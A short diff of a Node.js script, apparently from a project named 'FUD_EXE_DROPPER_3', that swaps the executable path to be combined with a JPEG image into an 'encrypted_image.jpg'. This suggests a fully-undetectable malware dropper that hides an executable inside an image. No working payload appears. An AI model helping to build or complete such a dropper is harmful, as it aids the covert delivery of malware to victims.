@@ -1,7 +1,7 @@
 const fs = require('fs');
 const path = require('path');
 
-const exeFile = 'C:/Users/this1/Desktop/FUD_EXE_DROPPER_3/Random_Console.exe';
+const exeFile = 'C:/Users/this1/Desktop/FUD_EXE_DROPPER_3/main.exe';
 const imageFile = 'C:/Users/this1/Desktop/FUD_EXE_DROPPER_3/nate.jpg';
 const outputFile = 'encrypted_image.jpg';
 
